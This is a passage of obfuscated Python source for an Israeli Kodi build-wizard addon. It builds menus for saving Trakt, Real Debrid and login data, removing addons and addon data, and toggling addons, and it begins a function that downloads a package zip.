	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00O0O00OO0OO0O0O .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0O0OO0O00O00000 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOO0OOOO000O000O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת פליליסט לאודר:  '%O0OO0O0000O0O00OO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות באפר: '%OO00OO000000O0O00 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת רשימות ריפו:  '%O0O0O0O000OO000OO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	setView ('files','viewType')#line:3173
def traktMenu ():#line:3175
	O0O00OOO00OOOO0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3176
	OO0OOOO00O0O0OO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3177
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Save Trakt Data: %s'%O0O00OOO00OOOO0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0OOOO00O0O0OO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	for O0O00OOO00OOOO0O0 in traktit .ORDER :#line:3183
		OO00OOOOO0O0OOOO0 =TRAKTID [O0O00OOO00OOOO0O0 ]['name']#line:3184
		O00O0OOOO0OO000O0 =TRAKTID [O0O00OOO00OOOO0O0 ]['path']#line:3185
		OO0OOOO0O0O0O00OO =TRAKTID [O0O00OOO00OOOO0O0 ]['saved']#line:3186
		OOOO0O00OO0OOOO0O =TRAKTID [O0O00OOO00OOOO0O0 ]['file']#line:3187
		O0OO00O0000O0000O =wiz .getS (OO0OOOO0O0O0O00OO )#line:3188
		OO00OOO0OO00OOO0O =traktit .traktUser (O0O00OOO00OOOO0O0 )#line:3189
		O0OOOOOOO00OOO00O =TRAKTID [O0O00OOO00OOOO0O0 ]['icon']if os .path .exists (O00O0OOOO0OO000O0 )else ICONTRAKT #line:3190
		OO00O00O0O0OO000O =TRAKTID [O0O00OOO00OOOO0O0 ]['fanart']if os .path .exists (O00O0OOOO0OO000O0 )else FANART #line:3191
		OO0OO0O00000OOOO0 =createMenu ('saveaddon','Trakt',O0O00OOO00OOOO0O0 )#line:3192
		O0000O0OOOO000OO0 =createMenu ('save','Trakt',O0O00OOO00OOOO0O0 )#line:3193
		OO0OO0O00000OOOO0 .append ((THEME2 %'%s Settings'%OO00OOOOO0O0OOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O00OOO00OOOO0O0 )))#line:3194
		addFile ('[+]-> %s'%OO00OOOOO0O0OOOO0 ,'',icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,themeit =THEME3 )#line:3196
		if not os .path .exists (O00O0OOOO0OO000O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =OO0OO0O00000OOOO0 )#line:3197
		elif not OO00OOO0OO00OOO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O00OOO00OOOO0O0 ,icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =OO0OO0O00000OOOO0 )#line:3198
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OOO0OO00OOO0O ,'authtrakt',O0O00OOO00OOOO0O0 ,icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =OO0OO0O00000OOOO0 )#line:3199
		if O0OO00O0000O0000O =="":#line:3200
			if os .path .exists (OOOO0O00OO0OOOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O00OOO00OOOO0O0 ,icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =O0000O0OOOO000OO0 )#line:3201
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O00OOO00OOOO0O0 ,icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =O0000O0OOOO000OO0 )#line:3202
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO00O0000O0000O ,'',icon =O0OOOOOOO00OOO00O ,fanart =OO00O00O0O0OO000O ,menu =O0000O0OOOO000OO0 )#line:3203
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3205
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	setView ('files','viewType')#line:3211
def realMenu ():#line:3213
	O000000000O0OOO00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3214
	O00OOO0OO0OO000OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3215
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Save Real Debrid Data: %s'%O000000000O0OOO00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3217
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00OOO0OO0OO000OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3218
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3219
	for OO000O000OOO0O0O0 in debridit .ORDER :#line:3221
		OO00OOOOOOO000O0O =DEBRIDID [OO000O000OOO0O0O0 ]['name']#line:3222
		O00O0OOOO00O00OOO =DEBRIDID [OO000O000OOO0O0O0 ]['path']#line:3223
		OO0O0OOO00O000OO0 =DEBRIDID [OO000O000OOO0O0O0 ]['saved']#line:3224
		O0OOOO0000O00O00O =DEBRIDID [OO000O000OOO0O0O0 ]['file']#line:3225
		O0OOOOOOO0O0OO0OO =wiz .getS (OO0O0OOO00O000OO0 )#line:3226
		O0OOO0O00OO0OO000 =debridit .debridUser (OO000O000OOO0O0O0 )#line:3227
		OOO0O0OOO0000OOO0 =DEBRIDID [OO000O000OOO0O0O0 ]['icon']if os .path .exists (O00O0OOOO00O00OOO )else ICONREAL #line:3228
		OOOOOOOOO0O00000O =DEBRIDID [OO000O000OOO0O0O0 ]['fanart']if os .path .exists (O00O0OOOO00O00OOO )else FANART #line:3229
		OO0OO0000O000O0O0 =createMenu ('saveaddon','Debrid',OO000O000OOO0O0O0 )#line:3230
		O00OOOO00O0O00000 =createMenu ('save','Debrid',OO000O000OOO0O0O0 )#line:3231
		OO0OO0000O000O0O0 .append ((THEME2 %'%s Settings'%OO00OOOOOOO000O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO000O000OOO0O0O0 )))#line:3232
		addFile ('[+]-> %s'%OO00OOOOOOO000O0O ,'',icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,themeit =THEME3 )#line:3234
		if not os .path .exists (O00O0OOOO00O00OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =OO0OO0000O000O0O0 )#line:3235
		elif not O0OOO0O00OO0OO000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO000O000OOO0O0O0 ,icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =OO0OO0000O000O0O0 )#line:3236
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOO0O00OO0OO000 ,'authdebrid',OO000O000OOO0O0O0 ,icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =OO0OO0000O000O0O0 )#line:3237
		if O0OOOOOOO0O0OO0OO =="":#line:3238
			if os .path .exists (O0OOOO0000O00O00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO000O000OOO0O0O0 ,icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =O00OOOO00O0O00000 )#line:3239
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO000O000OOO0O0O0 ,icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =O00OOOO00O0O00000 )#line:3240
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOOOO0O0OO0OO ,'',icon =OOO0O0OOO0000OOO0 ,fanart =OOOOOOOOO0O00000O ,menu =O00OOOO00O0O00000 )#line:3241
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3243
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	setView ('files','viewType')#line:3249
def loginMenu ():#line:3251
	O0O000O0O0000O000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3252
	O0000O0OOOOOO000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3253
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Save Login Data: %s'%O0O000O0O0000O000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0000O0OOOOOO000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	for O0O000O0O0000O000 in loginit .ORDER :#line:3259
		O000OO0OO0OOOOOO0 =LOGINID [O0O000O0O0000O000 ]['name']#line:3260
		O0O0O00OOOOO0OOO0 =LOGINID [O0O000O0O0000O000 ]['path']#line:3261
		OO0O00OO0000OO00O =LOGINID [O0O000O0O0000O000 ]['saved']#line:3262
		O00OO0O0O00OO00O0 =LOGINID [O0O000O0O0000O000 ]['file']#line:3263
		OOO0O0OOOOOO000OO =wiz .getS (OO0O00OO0000OO00O )#line:3264
		O00OOOOOO0OO00O00 =loginit .loginUser (O0O000O0O0000O000 )#line:3265
		OO0O000OOOO0O00O0 =LOGINID [O0O000O0O0000O000 ]['icon']if os .path .exists (O0O0O00OOOOO0OOO0 )else ICONLOGIN #line:3266
		O0O0O00O00OOOO0OO =LOGINID [O0O000O0O0000O000 ]['fanart']if os .path .exists (O0O0O00OOOOO0OOO0 )else FANART #line:3267
		OO0OOO0OOO0OOOOOO =createMenu ('saveaddon','Login',O0O000O0O0000O000 )#line:3268
		OO0OOOOO000000O00 =createMenu ('save','Login',O0O000O0O0000O000 )#line:3269
		OO0OOO0OOO0OOOOOO .append ((THEME2 %'%s Settings'%O000OO0OO0OOOOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0O000O0O0000O000 )))#line:3270
		addFile ('[+]-> %s'%O000OO0OO0OOOOOO0 ,'',icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,themeit =THEME3 )#line:3272
		if not os .path .exists (O0O0O00OOOOO0OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOO0OOO0OOOOOO )#line:3273
		elif not O00OOOOOO0OO00O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0O000O0O0000O000 ,icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOO0OOO0OOOOOO )#line:3274
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOOOOO0OO00O00 ,'authlogin',O0O000O0O0000O000 ,icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOO0OOO0OOOOOO )#line:3275
		if OOO0O0OOOOOO000OO =="":#line:3276
			if os .path .exists (O00OO0O0O00OO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0O000O0O0000O000 ,icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOOOO000000O00 )#line:3277
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0O000O0O0000O000 ,icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOOOO000000O00 )#line:3278
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O0OOOOOO000OO ,'',icon =OO0O000OOOO0O00O0 ,fanart =O0O0O00O00OOOO0OO ,menu =OO0OOOOO000000O00 )#line:3279
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3281
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	setView ('files','viewType')#line:3287
def fixUpdate ():#line:3289
	if KODIV <17 :#line:3290
		OOO00O0O00O0OOO0O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3291
		try :#line:3292
			os .remove (OOO00O0O00O0OOO0O )#line:3293
		except Exception as O0OOO00OO00OOOO00 :#line:3294
			wiz .log ("Unable to remove %s, Purging DB"%OOO00O0O00O0OOO0O )#line:3295
			wiz .purgeDb (OOO00O0O00O0OOO0O )#line:3296
	else :#line:3297
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3298
def removeAddonMenu ():#line:3300
	OOO00OO00O0O00O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3301
	O00O00OOO0OOOO00O =[];OOO00O0O00O00OOOO =[]#line:3302
	for O0000O0O0OO0OOOO0 in sorted (OOO00OO00O0O00O0O ,key =lambda O0OO000OOO0O000O0 :O0OO000OOO0O000O0 ):#line:3303
		O0O0OO0OOO0000O00 =os .path .split (O0000O0O0OO0OOOO0 [:-1 ])[1 ]#line:3304
		if O0O0OO0OOO0000O00 in EXCLUDES :continue #line:3305
		elif O0O0OO0OOO0000O00 in DEFAULTPLUGINS :continue #line:3306
		elif O0O0OO0OOO0000O00 =='packages':continue #line:3307
		O0O0OO00OOOO0OOO0 =os .path .join (O0000O0O0OO0OOOO0 ,'addon.xml')#line:3308
		if os .path .exists (O0O0OO00OOOO0OOO0 ):#line:3309
			O000OO0000OO00OOO =open (O0O0OO00OOOO0OOO0 )#line:3310
			O0000OOOOOO0OO000 =O000OO0000OO00OOO .read ()#line:3311
			O0OOO000OO0OOO000 =wiz .parseDOM (O0000OOOOOO0OO000 ,'addon',ret ='id')#line:3312
			OOOO0OO0O00O0OO00 =O0O0OO0OOO0000O00 if len (O0OOO000OO0OOO000 )==0 else O0OOO000OO0OOO000 [0 ]#line:3314
			try :#line:3315
				OOO0OO00OO0OOO0OO =xbmcaddon .Addon (id =OOOO0OO0O00O0OO00 )#line:3316
				O00O00OOO0OOOO00O .append (OOO0OO00OO0OOO0OO .getAddonInfo ('name'))#line:3317
				OOO00O0O00O00OOOO .append (OOOO0OO0O00O0OO00 )#line:3318
			except :#line:3319
				pass #line:3320
	if len (O00O00OOO0OOOO00O )==0 :#line:3321
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3322
		return #line:3323
	if KODIV >16 :#line:3324
		O000O0O0OO0O0O00O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O00OOO0OOOO00O )#line:3325
	else :#line:3326
		O000O0O0OO0O0O00O =[];OOO0OO0O00O000O0O =0 #line:3327
		OOO0OO00OO0OO00O0 =["-- Click here to Continue --"]+O00O00OOO0OOOO00O #line:3328
		while not OOO0OO0O00O000O0O ==-1 :#line:3329
			OOO0OO0O00O000O0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OO00OO0OO00O0 )#line:3330
			if OOO0OO0O00O000O0O ==-1 :break #line:3331
			elif OOO0OO0O00O000O0O ==0 :break #line:3332
			else :#line:3333
				OO0O0O0OO0O0OOO00 =(OOO0OO0O00O000O0O -1 )#line:3334
				if OO0O0O0OO0O0OOO00 in O000O0O0OO0O0O00O :#line:3335
					O000O0O0OO0O0O00O .remove (OO0O0O0OO0O0OOO00 )#line:3336
					OOO0OO00OO0OO00O0 [OOO0OO0O00O000O0O ]=O00O00OOO0OOOO00O [OO0O0O0OO0O0OOO00 ]#line:3337
				else :#line:3338
					O000O0O0OO0O0O00O .append (OO0O0O0OO0O0OOO00 )#line:3339
					OOO0OO00OO0OO00O0 [OOO0OO0O00O000O0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00O00OOO0OOOO00O [OO0O0O0OO0O0OOO00 ])#line:3340
	if O000O0O0OO0O0O00O ==None :return #line:3341
	if len (O000O0O0OO0O0O00O )>0 :#line:3342
		wiz .addonUpdates ('set')#line:3343
		for OOO0O00OOOO0OO00O in O000O0O0OO0O0O00O :#line:3344
			removeAddon (OOO00O0O00O00OOOO [OOO0O00OOOO0OO00O ],O00O00OOO0OOOO00O [OOO0O00OOOO0OO00O ],True )#line:3345
		xbmc .sleep (1000 )#line:3347
		if INSTALLMETHOD ==1 :O00O0O0O0OO000O00 =1 #line:3349
		elif INSTALLMETHOD ==2 :O00O0O0O0OO000O00 =0 #line:3350
		else :O00O0O0O0OO000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3351
		if O00O0O0O0OO000O00 ==1 :wiz .reloadFix ('remove addon')#line:3352
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3353
def removeAddonDataMenu ():#line:3355
	if os .path .exists (ADDOND ):#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3357
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3360
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3361
		O00000O00OO00OOO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3362
		for O0O0OOO0OO0OO0OO0 in sorted (O00000O00OO00OOO0 ,key =lambda O0O000OO000000O0O :O0O000OO000000O0O ):#line:3363
			OO0O00O00000OOO00 =O0O0OOO0OO0OO0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3364
			O00O00OO0OO0O00O0 =os .path .join (O0O0OOO0OO0OO0OO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3365
			OO0O0O0OOOOO0O00O =os .path .join (O0O0OOO0OO0OO0OO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3366
			OO0000OOOOO0OO000 =OO0O00O00000OOO00 #line:3367
			OO0O0OOOO0OO0O0O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3368
			for OO0OO00O0O0OO00OO in OO0O0OOOO0OO0O0O0 :#line:3369
				OO0000OOOOO0OO000 =OO0000OOOOO0OO000 .replace (OO0OO00O0O0OO00OO ,OO0O0OOOO0OO0O0O0 [OO0OO00O0O0OO00OO ])#line:3370
			if OO0O00O00000OOO00 in EXCLUDES :OO0000OOOOO0OO000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0000OOOOO0OO000 #line:3371
			else :OO0000OOOOO0OO000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0000OOOOO0OO000 #line:3372
			addFile (' %s'%OO0000OOOOO0OO000 ,'removedata',OO0O00O00000OOO00 ,icon =O00O00OO0OO0O00O0 ,fanart =OO0O0O0OOOOO0O00O ,themeit =THEME2 )#line:3373
	else :#line:3374
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3375
	setView ('files','viewType')#line:3376
def enableAddons ():#line:3378
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3379
	OO00OO000OOO00OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3380
	OOO0OO0OOO000O0O0 =0 #line:3381
	for OOOO0OO00OO0O000O in sorted (OO00OO000OOO00OOO ,key =lambda O0000O00OOOOO0OOO :O0000O00OOOOO0OOO ):#line:3382
		O0000O000O000O000 =os .path .split (OOOO0OO00OO0O000O [:-1 ])[1 ]#line:3383
		if O0000O000O000O000 in EXCLUDES :continue #line:3384
		if O0000O000O000O000 in DEFAULTPLUGINS :continue #line:3385
		OOO00OOO00OO00OOO =os .path .join (OOOO0OO00OO0O000O ,'addon.xml')#line:3386
		if os .path .exists (OOO00OOO00OO00OOO ):#line:3387
			OOO0OO0OOO000O0O0 +=1 #line:3388
			OO00OO000OOO00OOO =OOOO0OO00OO0O000O .replace (ADDONS ,'')[1 :-1 ]#line:3389
			O00OO0O000000O00O =open (OOO00OOO00OO00OOO )#line:3390
			O000O00OOOO0000O0 =O00OO0O000000O00O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3391
			OOOOOO0000O0O0O0O =wiz .parseDOM (O000O00OOOO0000O0 ,'addon',ret ='id')#line:3392
			O0OOOO00O0O0OOOOO =wiz .parseDOM (O000O00OOOO0000O0 ,'addon',ret ='name')#line:3393
			try :#line:3394
				OO000OOO0O0OO0O00 =OOOOOO0000O0O0O0O [0 ]#line:3395
				O00OOOOO0OOOOO000 =O0OOOO00O0O0OOOOO [0 ]#line:3396
			except :#line:3397
				continue #line:3398
			try :#line:3399
				O00OO0OO0OO0O000O =xbmcaddon .Addon (id =OO000OOO0O0OO0O00 )#line:3400
				OO0OO00OO0O0OO000 ="[COLOR green][Enabled][/COLOR]"#line:3401
				OOOO0000O00000O00 ="false"#line:3402
			except :#line:3403
				OO0OO00OO0O0OO000 ="[COLOR red][Disabled][/COLOR]"#line:3404
				OOOO0000O00000O00 ="true"#line:3405
				pass #line:3406
			OOOOO0O0000O000O0 =os .path .join (OOOO0OO00OO0O000O ,'icon.png')if os .path .exists (os .path .join (OOOO0OO00OO0O000O ,'icon.png'))else ICON #line:3407
			OO0OO0000O0OO0O00 =os .path .join (OOOO0OO00OO0O000O ,'fanart.jpg')if os .path .exists (os .path .join (OOOO0OO00OO0O000O ,'fanart.jpg'))else FANART #line:3408
			addFile ("%s %s"%(OO0OO00OO0O0OO000 ,O00OOOOO0OOOOO000 ),'toggleaddon',OO00OO000OOO00OOO ,OOOO0000O00000O00 ,icon =OOOOO0O0000O000O0 ,fanart =OO0OO0000O0OO0O00 )#line:3409
			O00OO0O000000O00O .close ()#line:3410
	if OOO0OO0OOO000O0O0 ==0 :#line:3411
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3412
	setView ('files','viewType')#line:3413
def changeFeq ():#line:3415
	O0O000OOOO0O0O0O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3416
	O00OOOO00000O0000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O000OOOO0O0O0O0 )#line:3417
	if not O00OOOO00000O0000 ==-1 :#line:3418
		wiz .setS ('autocleanfeq',str (O00OOOO00000O0000 ))#line:3419
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O000OOOO0O0O0O0 [O00OOOO00000O0000 ]))#line:3420
def developer ():#line:3422
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3423
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3424
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3425
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3426
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3427
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3428
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3429
	setView ('files','viewType')#line:3431
def download (O00O0000OOOO0000O ,O00000O0OOO000000 ):#line:3436
  OOOOO0OO00O0O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3437
  O0O0OOOOO00OOO000 =xbmcgui .DialogProgress ()#line:3438
  O0O0OOOOO00OOO000 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3439
  O0O0OOO000OOOOOO0 =os .path .join (OOOOO0OO00O0O0O0O ,'isr.zip')#line:3440
  OO00OO0OO0000O0OO =urllib2 .Request (O00O0000OOOO0000O )#line:3441
  OOO0OO000000O0O00 =urllib2 .urlopen (OO00OO0OO0000O0OO )#line:3442
  OOO00OO0000O0O000 =xbmcgui .DialogProgress ()#line:3444
  OOO00OO0000O0O000 .create ("Downloading","Downloading "+name )#line:3445
  OOO00OO0000O0O000 .update (0 )#line:3446
  OO00OO00OO00O00OO =O00000O0OOO000000 #line:3447
  OOOOO000OOOO00O00 =open (O0O0OOO000OOOOOO0 ,'wb')#line:3448
  try :#line:3450
    OO0O0000O000O00OO =OOO0OO000000O0O00 .info ().getheader ('Content-Length').strip ()#line:3451
    O00O000000O0O0000 =True #line:3452
  except AttributeError :#line:3453
        O00O000000O0O0000 =False #line:3454
  if O00O000000O0O0000 :#line:3456
        OO0O0000O000O00OO =int (OO0O0000O000O00OO )#line:3457
  OO000000OOO0O000O =0 #line:3459
  OOOO0O0O00OO0000O =time .time ()#line:3460
  while True :#line:3461
        OO00OO00O00OO00OO =OOO0OO000000O0O00 .read (8192 )#line:3462
        if not OO00OO00O00OO00OO :#line:3463
            sys .stdout .write ('\n')#line:3464
            break #line:3465
        OO000000OOO0O000O +=len (OO00OO00O00OO00OO )#line:3467
        OOOOO000OOOO00O00 .write (OO00OO00O00OO00OO )#line:3468
        if not O00O000000O0O0000 :#line:3470
            OO0O0000O000O00OO =OO000000OOO0O000O #line:3471
        if OOO00OO0000O0O000 .iscanceled ():#line:3472
           OOO00OO0000O0O000 .close ()#line:3473
           try :#line:3474
